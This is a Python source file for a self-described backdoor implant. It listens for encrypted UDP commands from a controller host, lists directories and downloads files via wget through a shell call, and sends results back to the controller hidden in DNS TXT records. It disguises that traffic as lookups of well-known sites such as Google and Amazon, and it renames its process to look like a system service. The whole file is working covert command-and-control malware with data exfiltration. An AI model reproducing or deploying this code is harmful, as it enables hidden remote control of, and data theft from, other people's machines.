"""
    This is the backdoor program. It receives commands from the controller,
    decrypts them, executes them, and then returns a response via a DNS
    query.
"""

# Ignore warnings
from warnings import filterwarnings
filterwarnings("ignore")

# Standard Modules
import os
from random import randint
import argparse
import sys

# Custom Modules
from utils.encryption import StreamEncryption
from utils.shell import LIST, WGET
from utils.validation import validate_ipv4_address, validate_nic_interface

# Third Party Libraries
from scapy.all import sniff, UDP, DNSQR, DNSRR, IP, DNS, send
from setproctitle import setproctitle


PARSER = argparse.ArgumentParser("./backdoor.py")
PARSER.add_argument("controller_ip", help="The IPv4 address of the controller host.")
PARSER.add_argument("backdoor_ip", help="The IPv4 address of the backdoor host.")
PARSER.add_argument("interface", help="The name of the Network Interface Device to listen on. i.e. wlo1, enp2s0, enp1s0")
ARGS = PARSER.parse_args()


if not validate_ipv4_address(ARGS.controller_ip):
    print(f"Invalid IPv4 Address: '{ARGS.controller_ip}'")
    sys.exit(1)

if not validate_ipv4_address(ARGS.backdoor_ip):
    print(f"Invalid IPv4 Address: '{ARGS.backdoor_ip}'")
    sys.exit(1)

if not validate_nic_interface(ARGS.interface):
    print(f"Network Interface does not exist: '{ARGS.interface}'")
    sys.exit(1)


# Global Variables
CONTROLLER_IP = ARGS.controller_ip
BACKDOOR_IP = ARGS.backdoor_ip
NETWORK_INTERFACE = ARGS.interface
ENCRYPTION_HANDLER = StreamEncryption()

# List of legit hostnames
HOSTNAMES = ["play.google.com",
             "pixel.33across.com",
             "signaler-pa.clients6.google.com",
             "www.youtube.com",
             "www.google.ca",
             "www.amazon.ca",
             "www.amazon.com",
             "safebrowsing.googleapis.com",
             "upload.wikimedia.org",
             "hhopenbid.pubmatic.com"]


# Initialize the encryption context.
ENCRYPTION_HANDLER.read_nonce("data/nonce.bin")
ENCRYPTION_HANDLER.read_secret("data/secret.key")
ENCRYPTION_HANDLER.initialize_encryption_context()


class DirectoryNotFound(Exception): pass


def get_random_hostname():
    size = len(HOSTNAMES)
    index = randint(0, size-1)
    return HOSTNAMES[index]


def receive_udp_command(pkt):
    msg_len = pkt[UDP].len
    ciphertext = bytes(pkt[UDP].payload)[0:msg_len]
    msg_bytes = ENCRYPTION_HANDLER.decrypt(ciphertext)
    msg = msg_bytes.decode("utf-8")
    return msg


def send_dns_query(query):
    """
        Send dns query.
    """
    send(query, verbose=0)


def forge_dns_query(data: str):
    """
        Forge dns query.
    """
    hostname = get_random_hostname()
    encrypted_data = ENCRYPTION_HANDLER.encrypt(data.encode("utf-8"))
    if len(encrypted_data) > 255:
        print("ERROR: Can't fit more than 255 bytes in TXT record!")
        print("Truncating data...")
        encrypted_data = encrypted_data[0:256]
    # Forge the DNS packet with data in the text record.
    query = IP(dst=CONTROLLER_IP)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=hostname), ar=DNSRR(type="TXT", ttl=4, rrname=hostname, rdlen=len(encrypted_data)+1, rdata=encrypted_data))
    return query


def hide_process_name(name: str):
    """
    
    """
    setproctitle(name)


def execute_list_command(file_path: str) -> bool:
    """
    
    """
    try:
        contents = list_directory_contents(file_path)
    except DirectoryNotFound:
        query = forge_dns_query(data="ERRORMSG: Directory not found.")
        send_dns_query(query)
        return False
    data = ""
    for name in contents:
        data += name
        data += " "
    data = data.strip()
    query = forge_dns_query(data=data)
    send_dns_query(query)
    return True


def execute_wget_command(url: str, filepath: str) -> bool:
    """
    
    """
    if not os.path.isdir(filepath):
        query = forge_dns_query(data="ERRORMSG: Directory not found or filepath is not a directory.")
        send_dns_query(query)
        return False
    query = forge_dns_query(data="Success.")
    send_dns_query(query)
    os.system(f"wget {url} -P {filepath}")
    return True


def list_directory_contents(file_path: str) -> list:
    """
    
    """
    if not os.path.isdir(file_path):
        raise DirectoryNotFound
    return os.listdir(file_path)


def packet_handler(pkt):
    """
    
    """
    if pkt[UDP].sport != 10069 or pkt[UDP].dport != 10420:
        return
    command = receive_udp_command(pkt)
    print(f"Received: {command}")
    argv = command.split(" ")
    argc = len(argv)
    if argc == 2:
        if argv[0] == LIST:
            execute_list_command(argv[1])
            return
    if argc == 3:
        if argv[0] == WGET:
            execute_wget_command(argv[1], argv[2])


if __name__ == "__main__":
    hide_process_name("systemd-userwork-evil")
    sniff(filter=f"ip src host {CONTROLLER_IP} and not port ssh and udp and not icmp", iface=f"{NETWORK_INTERFACE}", prn=packet_handler)
